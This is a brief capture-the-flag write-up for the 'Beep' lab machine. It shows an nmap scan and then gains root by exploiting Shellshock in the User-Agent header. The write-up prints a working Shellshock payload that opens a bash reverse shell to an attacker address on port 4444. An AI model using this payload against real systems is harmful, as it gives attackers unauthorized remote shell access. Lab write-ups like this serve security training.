Beep without metasploit

![Beep](https://user-images.githubusercontent.com/55708909/91585921-55029e80-e972-11ea-85c4-3a37089d94a2.png)


Starting with nmap scan:

Nmap -sC -sV -T4 -A -O -oA Beep -p- 10.10.10.7

![Beep_nmap](https://user-images.githubusercontent.com/55708909/91586333-d3f7d700-e972-11ea-8b90-d5c384bd3ff1.png)

I am quickly gonna take down this machine as i am feeling tired and its already too late .

I am gonna apply shockshell vulnnerability in user agent and will get root priviledges.

![Beep_login](https://user-images.githubusercontent.com/55708909/91586720-64ceb280-e973-11ea-9f74-20639f470ce8.png)

As you can see we now have root priviledges by applying shell shock vuln in the user agent

() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1

![Beep_shock](https://user-images.githubusercontent.com/55708909/91626607-316d4180-e9ce-11ea-945b-00265b917d9e.png)




